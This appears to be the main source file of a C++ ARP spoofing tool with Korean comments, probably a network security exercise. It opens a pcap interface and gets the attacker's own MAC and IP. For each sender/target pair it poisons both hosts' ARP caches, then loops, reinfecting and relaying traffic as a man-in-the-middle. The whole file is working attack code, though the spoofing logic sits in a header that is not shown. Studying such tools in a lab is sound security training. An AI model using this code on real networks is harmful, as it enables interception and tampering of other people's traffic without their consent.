#include <cstdio>
#include <cstdlib>
#include <vector>
#include <pcap.h>

#include "arpspoofmanager.h"
#include "netinfo.h"

// === 사용법이 잘못됐을 때 필요한 인자를 안내한다.
void usage() {
    std::printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    std::printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    // === 인터페이스 1개와 sender/target IP 쌍이 최소 1개는 있어야 한다.
    if (argc < 4 || ((argc - 2) % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    // === pcap 핸들을 열어 이후의 모든 패킷 송수신을 이 인터페이스로 처리한다.
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        std::fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac attackerMac;
    Ip attackerIp;

    // === 공격자 자신의 MAC/IP를 알아야 ARP 패킷의 출발지 정보를 채울 수 있다.
    if (!getAttackerInfo(dev, attackerMac, attackerIp)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    ArpSpoofManager manager(pcap, attackerMac, attackerIp);
    std::vector<SpoofSession> sessions;

    // === 각 sender/target 쌍마다 세션을 만들고, 먼저 실제 MAC 주소를 알아낸다.
    for (int i = 2; i < argc; i += 2) {
        SpoofSession session{Ip(argv[i]), Mac(), Ip(argv[i + 1]), Mac()};
        if (!manager.initializeSession(session)) {
            std::fprintf(stderr, "failed to resolve mac addresses for %s -> %s\n", argv[i], argv[i + 1]);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }
        sessions.push_back(session);
    }

    // === 양쪽 호스트의 ARP 캐시를 먼저 오염시켜 공격자가 중간에 끼어들 수 있게 만든다.
    if (!manager.infectAll(sessions)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    std::printf("initial infection complete for %zu flow(s)\n", sessions.size());

    // === 감염 이후에는 계속 패킷을 감시하면서 재감염과 릴레이를 반복한다.
    manager.relayLoop(sessions);

    pcap_close(pcap);
    return EXIT_SUCCESS;
}
